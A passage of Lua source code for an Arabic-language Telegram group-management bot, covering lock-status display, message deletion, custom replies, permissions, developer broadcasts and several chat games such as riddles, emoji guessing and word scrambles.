"\nعلامة ال (✖) تعني معطل"..
"\n━━━━━━━━"..
"\n• الروابط "..lock_links..
"\n".."• الكلايش "..lock_spam..
"\n".."• الكيبورد "..lock_inlin..
"\n".."• الاغاني "..lock_vico..
"\n".."• المتحركه "..lock_gif..
"\n".."• الملفات "..lock_file..
"\n".."• الدردشه "..lock_text..
"\n".."• الفيديو "..lock_ved..
"\n".."• الصور "..lock_photo..
"\n━━━━━━━━"..
"\n".."• المعرفات  "..lock_user..
"\n".."• التاك "..lock_hash..
"\n".."• البوتات "..lock_bots..
"\n".."• التوجيه "..lock_fwd..
"\n".."• الصوت "..lock_muse..
"\n".."• الملصقات "..lock_ste..
"\n".."• الجهات "..lock_phon..
"\n".."• الدخول "..lock_join..
"\n".."• الاضافه "..lock_add..
"\n".."• السيلفي "..lock_self..
"\n━━━━━━━━"..
"\n".."• التثبيت "..lock_pin..
"\n".."• الاشعارات "..lock_tagservr..
"\n".."• الماركدون "..lock_mark..
"\n".."• التعديل "..lock_edit..
"\n".."• الالعاب "..lock_geam..
"\n".."• التكرار "..flood..
"\n━━━━━━━━"..
"\n".."• الترحيب "..welcome..
"\n".."• الرفع "..Setusers..
"\n".."• الطرد "..Banusers..
"\n".."• الايدي "..IdPhoto..
"\n".."• الايدي بالصوره "..IdPyPhoto..
"\n".."• اطردني "..KickMe..
"\n".."• الردود "..ReplyManager..
"\n".."• الردود العامه  "..ReplySudo..
"\n".."• اوامر التحشيش "..FunGroup..
"\n".."• جلب الرابط "..Link_Group..
"\n".."• عدد التكرار ← {"..Num_Flood.."}\n\n.*")     
end
if text and text:match('^مسح (%d+)$') and Admin(msg) or text and text:match('^حذف (%d+)$') and Admin(msg) or text and text:match('^العراب (%d+)$') and Admin(msg) then    
local Msg_Num = tonumber(text:match('^مسح (%d+)$')) or tonumber(text:match('^حذف (%d+)$'))  or tonumber(text:match('^العراب (%d+)$')) 
if Msg_Num > 1000 then 
send(msg.chat_id_, msg.id_,'• تستطيع حذف *(1000)* رساله فقط') 
return false  
end  
local Message = msg.id_
for i=1,tonumber(Msg_Num) do
Delete_Message(msg.chat_id_,{[0]=Message})
Message = Message - 1048576
end
send(msg.chat_id_, msg.id_,'• تم ازالة *- '..Msg_Num..'* رساله من المجموعه')  
end

if text and text:match("^تغير رد مطور   (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد مطور   (.*)$") 
redis:set(bot_id.."Tshakex:Developer:Bot:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"•  تم تغير رد مطور   الى :"..Teext)
return false end
if text and text:match("^تغير رد المنشئ الاساسي (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المنشئ الاساسي (.*)$") 
redis:set(bot_id.."Tshakex:President:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"•  تم تغير رد المنشئ الاساسي الى :"..Teext)
return false end
if text and text:match("^تغير رد المنشئ (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
redis:set(bot_id.."Tshakex:Constructor:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"•  تم تغير رد المنشئ الى :"..Teext)
return false end
if text and text:match("^تغير رد المدير (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المدير (.*)$") 
redis:set(bot_id.."Tshakex:Manager:Group:Reply"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_,"•  تم تغير رد المدير الى :"..Teext)
return false end
if text and text:match("^تغير رد الادمن (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد الادمن (.*)$") 
redis:set(bot_id.."Tshakex:Admin:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"•  تم تغير رد الادمن الى :"..Teext)
return false end
if text and text:match("^تغير رد المميز (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد المميز (.*)$") 
redis:set(bot_id.."Tshakex:Vip:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"•  تم تغير رد المميز الى :"..Teext)
return false end
if text and text:match("^تغير رد العضو (.*)$") and Owner(msg) then
local Teext = text:match("^تغير رد العضو (.*)$") 
redis:set(bot_id.."Tshakex:Mempar:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"•  تم تغير رد العضو الى :"..Teext)
return false end
if text == 'حذف رد مطور  ' and Owner(msg) then
redis:del(bot_id.."Tshakex:Developer:Bot:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"• تم حدف رد مطور  ")
return false end
if text == 'حذف رد المنشئ الاساسي' and Owner(msg) then
redis:del(bot_id.."Tshakex:President:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"• تم حذف رد المنشئ الاساسي ")
return false end
if text == 'حذف رد المنشئ' and Owner(msg) then
redis:del(bot_id.."Tshakex:Constructor:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"• تم حذف رد المنشئ ")
return false end
if text == 'حذف رد المدير' and Owner(msg) then
redis:del(bot_id.."Tshakex:Manager:Group:Reply"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"• تم حذف رد المدير ")
return false end
if text == 'حذف رد الادمن' and Owner(msg) then
redis:del(bot_id.."Tshakex:Admin:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"• تم حذف رد الادمن ")
return false end
if text == 'حذف رد المميز' and Owner(msg) then
redis:del(bot_id.."Tshakex:Vip:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"• تم حذف رد المميز")
return false end
if text == 'حذف رد العضو' and Owner(msg) then
redis:del(bot_id.."Tshakex:Mempar:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"• تم حذف رد العضو")
return false 
end

if text == ("مسح الردود") and Owner(msg) then
local list = redis:smembers(bot_id.."Tshakex:List:Manager"..msg.chat_id_.."")
for k,v in pairs(list) do
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Gif"..v..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Vico"..v..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Text"..v..msg.chat_id_)   
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Photo"..v..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Video"..v..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:File"..v..msg.chat_id_)
redis:del(bot_id.."Tshakex:Add:Rd:Manager:Audio"..v..msg.chat_id_)
redis:del(bot_id.."Tshakex:List:Manager"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"• تم مسح قائمة الردود")
return false 
end
if text == ("الردود") and Owner(msg) then
local list = redis:smembers(bot_id.."Tshakex:List:Manager"..msg.chat_id_.."")
text = "• قائمة الردود \n━━━━━━━━\n"
for k,v in pairs(list) do
if redis:get(bot_id.."Tshakex:Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = "متحركه "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = "بصمه "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = "ملصق "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = "رساله "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = "صوره "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = "فيديو "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Manager:File"..v..msg.chat_id_) then
db = "ملف "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = "اغنيه "
end
text = text..""..k.." » {"..v.."} » {"..db.."}\n"
end
if #list == 0 then
text = "• عذرا لا يوجد الردود في المجموعه"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
return false 
end
if text == "الصلاحيات" and Admin(msg) then 
local list = redis:smembers(bot_id.."Tshakex:Validitys:Group"..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,"• لا توجد صلاحيات مضافه هنا")
return false
end
Validity = "\n• قائمة الصلاحيات المضافه \n━━━━━━━━\n"
for k,v in pairs(list) do
var = redis:get(bot_id.."Tshakex:Add:Validity:Group:Rt"..v..msg.chat_id_)
if var then
Validity = Validity..""..k.."- "..v.." ~ ("..var..")\n"
else
Validity = Validity..""..k.."- "..v.."\n"
end
end
send(msg.chat_id_, msg.id_,Validity)
end
if text == "الاوامر المضافه" and Constructor(msg) then
local list = redis:smembers(bot_id.."Tshakex:Command:List:Group"..msg.chat_id_.."")
Command = "• قائمة الاوامر المضافه  \n━━━━━━━━\n"
for k,v in pairs(list) do
Commands = redis:get(bot_id.."Tshakex:Get:Reides:Commands:Group"..msg.chat_id_..":"..v)
if Commands then 
Command = Command..""..k..": ("..v..") ← {"..Commands.."}\n"
else
Command = Command..""..k..": ("..v..") \n"
end
end
if #list == 0 then
Command = "• لا توجد اوامر اضافيه"
end
send(msg.chat_id_, msg.id_,"["..Command.."]")
end
if text == "حذف الاوامر المضافه" and Constructor(msg) or text == "مسح الاوامر المضافه" and Constructor(msg) then 
local list = redis:smembers(bot_id.."Tshakex:Command:List:Group"..msg.chat_id_)
for k,v in pairs(list) do
redis:del(bot_id.."Tshakex:Get:Reides:Commands:Group"..msg.chat_id_..":"..v)
redis:del(bot_id.."Tshakex:Command:List:Group"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"• تم مسح جميع الاوامر التي تم اضافتها")  
end
if text == "مسح الصلاحيات" and Constructor(msg) then
local list = redis:smembers(bot_id.."Tshakex:Validitys:Group"..msg.chat_id_)
for k,v in pairs(list) do;redis:del(bot_id.."Tshakex:Add:Validity:Group:Rt"..v..msg.chat_id_);redis:del(bot_id.."Tshakex:Validitys:Group"..msg.chat_id_);end
send(msg.chat_id_, msg.id_,"• تم مسح صلاحيات المجموعه")
end
if text == "اضف رد" and Owner(msg) then
send(msg.chat_id_, msg.id_,"• ارسل الان الكلمه لاضافتها في الردود ")
redis:set(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد" and Owner(msg) then
send(msg.chat_id_, msg.id_,"• ارسل الان الكلمه لحذفها من الردود")
redis:set(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
return false 
end
if text == ("مسح الردود العامه") and DeveloperBot1(msg) then 
local list = redis:smembers(bot_id.."Tshakex:List:Rd:Sudo")
for k,v in pairs(list) do
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:Gif"..v)   
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:vico"..v)   
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:stekr"..v)     
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:Text"..v)   
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:Photo"..v)
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:Video"..v)
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:File"..v)
redis:del(bot_id.."Tshakex:Add:Rd:Sudo:Audio"..v)
redis:del(bot_id.."Tshakex:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"• تم حذف الردود العامه ")
return false 
end
if text == ("الردود العامه") and DeveloperBot1(msg) then 
local list = redis:smembers(bot_id.."Tshakex:List:Rd:Sudo")
text = "\n• قائمة الردود العامه  \n━━━━━━━━\n"
for k,v in pairs(list) do
if redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Gif"..v) then
db = "متحركه "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Sudo:vico"..v) then
db = "بصمه "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Sudo:stekr"..v) then
db = "ملصق "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Text"..v) then
db = "رساله "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Photo"..v) then
db = "صوره "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Video"..v) then
db = "فيديو "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Sudo:File"..v) then
db = "ملف "
elseif redis:get(bot_id.."Tshakex:Add:Rd:Sudo:Audio"..v) then
db = "اغنيه "
end
text = text..""..k.." » {"..v.."} » {"..db.."}\n"
end
if #list == 0 then
text = "• لا توجد ردود عامه"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
return false 
end
if text == "اضف رد عام" and DeveloperBot1(msg) then 
send(msg.chat_id_, msg.id_,"• ارسل الان الكلمه لاضافتها في الردود العامه ")
redis:set(bot_id.."Tshakex:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد عام" and DeveloperBot1(msg) then 
send(msg.chat_id_, msg.id_,"• ارسل الان الكلمه لحذفها من الردود العامه ")
redis:set(bot_id.."Tshakex:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "اضف امر" and Constructor(msg) then
redis:set(bot_id.."Tshakex:Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"• الان ارسل لي الامر القديم ...")  
return false 
end
if text == "حذف امر" and Constructor(msg) or text == "مسح امر" and Constructor(msg) then 
redis:set(bot_id.."Tshakex:Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"• ارسل الان الامر الذي قمت بوضعه مكان الامر القديم")  
return false 
end
if text and text:match("^مسح صلاحيه (.*)$") and Admin(msg) or text and text:match("^حذف صلاحيه (.*)$") and Admin(msg) then 
local ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
redis:del(bot_id.."Tshakex:Add:Validity:Group:Rt"..ComdNew..msg.chat_id_)
redis:srem(bot_id.."Tshakex:Validitys:Group"..msg.chat_id_,ComdNew)  
send(msg.chat_id_, msg.id_, "\n• تم مسح ← { "..ComdNew..' } من الصلاحيات') 
return false 
end
if text and text:match("^اضف صلاحيه (.*)$") and Admin(msg) then 
local ComdNew = text:match("^اضف صلاحيه (.*)$")
redis:set(bot_id.."Tshakex:Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
redis:sadd(bot_id.."Tshakex:Validitys:Group"..msg.chat_id_,ComdNew)  
redis:setex(bot_id.."Tshakex:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, "\n• ارسل نوع الصلاحيه كما مطلوب منك :\n• انواع الصلاحيات المطلوبه ← { عضو ، مميز  ، ادمن  ، مدير }") 
return false 
end
if text == 'المطور' or text == 'مطور' then
local TextingDevStorm = redis:get(bot_id..'Tshakex:Texting:DevSlbotss')
if TextingDevStorm then 
send(msg.chat_id_, msg.id_,TextingDevStorm)
else
send(msg.chat_id_, msg.id_,'[@'..UserName_Dev..']')
end
end
if text == 'وضع كليشه المطور' and Dev_Bots(msg) then
redis:set(bot_id..'Tshakex:GetTexting:DevSlbotss'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'•  ارسل لي الكليشه الان')
return false 
end
if text == 'حذف كليشه المطور' and Dev_Bots(msg) then
redis:del(bot_id..'Tshakex:Texting:DevSlbotss')
send(msg.chat_id_, msg.id_,'•  تم حذف كليشه مطور  ')
end
if text == "تغير اسم البوت" and Dev_Bots(msg) or text == "تغير اسم البوت" and Dev_Bots(msg) then 
redis:setex(bot_id.."Tshakex:Change:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"•  ارسل لي الاسم الان ")  
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DeveloperBot(msg) then 
if redis:get(bot_id.."Tshakex:Broadcasting:Bot") and not Dev_Bots(msg) then 
send(msg.chat_id_, msg.id_,"• تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Tshakex:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي المنشور الان\n• يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n• لالغاء الاذاعه ارسل : الغاء") 
return false
end
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and DeveloperBot(msg) then 
if redis:get(bot_id.."Tshakex:Broadcasting:Bot") and not Dev_Bots(msg) then 
send(msg.chat_id_, msg.id_,"• تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Tshakex:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي المنشور الان\n• يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n• لالغاء الاذاعه ارسل : الغاء") 
return false
end
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and DeveloperBot(msg) then 
if redis:get(bot_id.."Tshakex:Broadcasting:Bot") and not Dev_Bots(msg) then 
send(msg.chat_id_, msg.id_,"• تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Tshakex:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي التوجيه الان\n• ليتم افتاراته في المجموعات") 
return false
end
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and DeveloperBot(msg) then 
if redis:get(bot_id.."Tshakex:Broadcasting:Bot") and not Dev_Bots(msg) then 
send(msg.chat_id_, msg.id_,"• تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
redis:setex(bot_id.."Tshakex:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"• ارسل لي التوجيه الان\n• ليتم افتاراته الى المشتركين") 
return false
end
if text == 'تعين الايدي' and Owner(msg) then
redis:setex(bot_id.."Tshakex:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
send(msg.chat_id_, msg.id_,[[
• ارسل الان النص
• يمكنك اضافه :
• `#username` » اسم المستخدم
• `#msgs` » عدد الرسائل
• `#photos` » عدد الصور
• `#id` » ايدي المستخدم
• `#auto` » نسبة التفاعل
• `#stast` » رتبة المستخدم 
• `#edit` » عدد السحكات
• `#game` » عدد النقاط
• `#AddMem` » عدد الجهات
• `#Description` » تعليق الصوره
]])
return false  
end 
if text == "سمايلات" or text == "سمايل" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Tshakex:Set:Sma"..msg.chat_id_)
Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","??","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","🇮🇶","⚔","🛡","🔮","🌡","💣","📌","📍","📓","📗","📂","📅","📪","📫","📬","📭","⏰","📺","🎚","☎️","📡"}
SM = Random[math.random(#Random)]
redis:set(bot_id.."Tshakex:Random:Sm"..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,"• اسرع واحد يرسل هاذا السمايل ?  `"..SM.."`")
return false
end
end
if text == "الاسرع" or tect == "ترتيب" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Tshakex:Speed:Tr"..msg.chat_id_)
KlamSpeed = {"سحور","سياره","استقبال","قنفه","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","كهوه","سفينه","العراق","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","بتيته","لهانه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنيت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
redis:set(bot_id.."Tshakex:Klam:Speed"..msg.chat_id_,name)
name = string.gsub(name,"سحور","س ر و ح")
name = string.gsub(name,"سياره","ه ر س ي ا")
name = string.gsub(name,"استقبال","ل ب ا ت ق س ا")
name = string.gsub(name,"قنفه","ه ق ن ف")
name = string.gsub(name,"ايفون","و ن ف ا")
name = string.gsub(name,"بزونه","ز و ه ن")
name = string.gsub(name,"مطبخ","خ ب ط م")
name = string.gsub(name,"كرستيانو","س ت ا ن و ك ر ي")
name = string.gsub(name,"دجاجه","ج ج ا د ه")
name = string.gsub(name,"مدرسه","ه م د ر س")
name = string.gsub(name,"الوان","ن ا و ا ل")
name = string.gsub(name,"غرفه","غ ه ر ف")
name = string.gsub(name,"ثلاجه","ج ه ت ل ا")
name = string.gsub(name,"كهوه","ه ك ه و")
name = string.gsub(name,"سفينه","ه ن ف ي س")
name = string.gsub(name,"العراق","ق ع ا ل ر ا")
name = string.gsub(name,"محطه","ه ط م ح")
name = string.gsub(name,"طياره","ر ا ط ي ه")
name = string.gsub(name,"رادار","ر ا ر ا د")
name = string.gsub(name,"منزل","ن ز م ل")
name = string.gsub(name,"مستشفى","ى ش س ف ت م")
name = string.gsub(name,"كهرباء","ر ب ك ه ا ء")
name = string.gsub(name,"تفاحه","ح ه ا ت ف")
name = string.gsub(name,"اخطبوط","ط ب و ا خ ط")
name = string.gsub(name,"سلمون","ن م و ل س")
name = string.gsub(name,"فرنسا","ن ف ر س ا")
name = string.gsub(name,"برتقاله","ر ت ق ب ا ه ل")
name = string.gsub(name,"تفاح","ح ف ا ت")
name = string.gsub(name,"مطرقه","ه ط م ر ق")
name = string.gsub(name,"بتيته","ب ت ت ي ه")
name = string.gsub(name,"لهانه","ه ن ل ه ل")
name = string.gsub(name,"شباك","ب ش ا ك")
name = string.gsub(name,"باص","ص ا ب")
name = string.gsub(name,"سمكه","ك س م ه")
name = string.gsub(name,"ذباب","ب ا ب ذ")
name = string.gsub(name,"تلفاز","ت ف ل ز ا")
name = string.gsub(name,"حاسوب","س ا ح و ب")
name = string.gsub(name,"انترنيت","ا ت ن ر ن ي ت")
name = string.gsub(name,"ساحه","ح ا ه س")
name = string.gsub(name,"جسر","ر ج س")
send(msg.chat_id_, msg.id_,"• اسرع واحد يرتبها "..name.."")
return false
end
end
if text == "حزوره" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Tshakex:Set:Hzora"..msg.chat_id_)
Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
name = Hzora[math.random(#Hzora)]
redis:set(bot_id.."Tshakex:Klam:Hzor"..msg.chat_id_,name)
name = string.gsub(name,"الجرس","شيئ اذا لمسته صرخ ما هوه ؟")
name = string.gsub(name,"عقرب الساعه","اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟")
name = string.gsub(name,"السمك","ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟")
name = string.gsub(name,"المطر","شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟")
name = string.gsub(name,"5","ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ")
name = string.gsub(name,"الكتاب","ما الشيئ الذي له اوراق وليس له جذور ؟")
name = string.gsub(name,"البسمار","ما هو الشيئ الذي لا يمشي الا بالضرب ؟")
name = string.gsub(name,"7","عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ")
name = string.gsub(name,"الكعبه","ما هو الشيئ الموجود وسط مكة ؟")
name = string.gsub(name,"بيت الشعر","ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ")
name = string.gsub(name,"لهانه","وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ")
name = string.gsub(name,"انا","ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟")
name = string.gsub(name,"امي","اخت خالك وليست خالتك من تكون ؟ ")
name = string.gsub(name,"الابره","ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ")
name = string.gsub(name,"الساعه","ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟")
name = string.gsub(name,"22","كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ")
name = string.gsub(name,"غلط","ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ")
name = string.gsub(name,"كم الساعه","ما هو السؤال الذي تختلف اجابته دائما ؟")
name = string.gsub(name,"البيتنجان","جسم اسود وقلب ابيض وراس اخظر فما هو ؟")
name = string.gsub(name,"البيض","ماهو الشيئ الذي اسمه على لونه ؟")
name = string.gsub(name,"المرايه","ارى كل شيئ من دون عيون من اكون ؟ ")
name = string.gsub(name,"الضوء","ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟")
name = string.gsub(name,"الهواء","ما هو الشيئ الذي يسير امامك ولا تراه ؟")
name = string.gsub(name,"الضل","ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ")
name = string.gsub(name,"العمر","ما هو الشيء الذي كلما طال قصر ؟ ")
name = string.gsub(name,"القلم","ما هو الشيئ الذي يكتب ولا يقرأ ؟")
name = string.gsub(name,"المشط","له أسنان ولا يعض ما هو ؟ ")
name = string.gsub(name,"الحفره","ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟")
name = string.gsub(name,"البحر","ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟")
name = string.gsub(name,"الثلج","انا ابن الماء فان تركوني في الماء مت فمن انا ؟")
name = string.gsub(name,"الاسفنج","كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟")
name = string.gsub(name,"الصوت","اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟")
name = string.gsub(name,"بلم","حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ")
send(msg.chat_id_, msg.id_,"• اسرع واحد يحل الحزوره ↓\n "..name.."")
return false
end
end
if text == "معاني" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Tshakex:Set:Maany"..msg.chat_id_)
Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
name = Maany_Rand[math.random(#Maany_Rand)]
redis:set(bot_id.."Tshakex:Maany"..msg.chat_id_,name)
name = string.gsub(name,"قرد","🐒")
name = string.gsub(name,"دجاجه","🐔")
name = string.gsub(name,"بطريق","🐧")
name = string.gsub(name,"ضفدع","🐸")
name = string.gsub(name,"بومه","🦉")
name = string.gsub(name,"نحله","🐝")
name = string.gsub(name,"ديك","🐓")
name = string.gsub(name,"جمل","🐫")
name = string.gsub(name,"بقره","🐄")
name = string.gsub(name,"دولفين","🐬")
name = string.gsub(name,"تمساح","🐊")
name = string.gsub(name,"قرش","🦈")
name = string.gsub(name,"نمر","🐅")
name = string.gsub(name,"اخطبوط","🐙")
name = string.gsub(name,"سمكه","🐟")
name = string.gsub(name,"خفاش","🦇")
name = string.gsub(name,"اسد","🦁")
name = string.gsub(name,"فأر","🐭")
name = string.gsub(name,"ذئب","🐺")
name = string.gsub(name,"فراشه","🦋")
name = string.gsub(name,"عقرب","🦂")
name = string.gsub(name,"زرافه","🦒")
name = string.gsub(name,"قنفذ","??")
name = string.gsub(name,"تفاحه","🍎")
name = string.gsub(name,"باذنجان","🍆")
send(msg.chat_id_, msg.id_,"• اسرع واحد يرسل معنى السمايل "..name.."")
return false
end
end
if text == "العكس" then
if redis:get(bot_id.."Tshakex:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Tshakex:Set:Aks"..msg.chat_id_)
katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
name = katu[math.random(#katu)]
redis:set(bot_id.."Tshakex:Set:Aks:Game"..msg.chat_id_,name)
name = string.gsub(name,"باي","هلو")
name = string.gsub(name,"فهمت","مافهمت")
name = string.gsub(name,"موزين","زين")
name = string.gsub(name,"اسمعك","ماسمعك")
name = string.gsub(name,"احبك","ماحبك")
name = string.gsub(name,"موحلو","حلو")
name = string.gsub(name,"نضيف","وصخ")
name = string.gsub(name,"حاره","بارده")
name = string.gsub(name,"ناصي","عالي")
name = string.gsub(name,"جوه","فوك")
name = string.gsub(name,"سريع","بطيء")
name = string.gsub(name,"ونسه","ضوجه")
name = string.gsub(name,"طويل","قزم")
name = string.gsub(name,"سمين","ضعيف")
